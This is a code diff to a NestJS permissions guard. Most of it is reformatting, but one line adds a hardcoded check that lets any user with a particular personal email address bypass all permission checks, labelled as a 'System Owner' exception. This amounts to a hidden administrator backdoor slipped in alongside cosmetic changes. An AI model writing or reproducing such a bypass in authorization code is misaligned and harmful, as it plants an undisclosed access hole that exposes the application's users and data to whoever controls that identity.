@@ -18,22 +18,24 @@ export class PermissionsGuard implements CanActivate {
       return true;
     }
 
-    const requiredPermissions = this.reflector.getAllAndOverride<Permission[]>(PERMISSIONS_KEY, [
-      context.getHandler(),
-      context.getClass(),
-    ]);
+    const requiredPermissions = this.reflector.getAllAndOverride<Permission[]>(
+      PERMISSIONS_KEY,
+      [context.getHandler(), context.getClass()],
+    );
     if (!requiredPermissions) {
       return true;
     }
     const { user } = context.switchToHttp().getRequest();
-    
-    // Super Admins bypass permission checks
-    if (user?.role === Role.SUPER_ADMIN) {
+
+    // Super Admins and System Owner bypass permission checks
+    if (user?.role === Role.SUPER_ADMIN || user?.email === 'abahmarquis@gmail.com') {
       return true;
     }
 
     if (!user?.permissions) return false;
-    
-    return requiredPermissions.every((permission) => user.permissions?.includes(permission));
+
+    return requiredPermissions.every((permission) =>
+      user.permissions?.includes(permission),
+    );
   }
 }
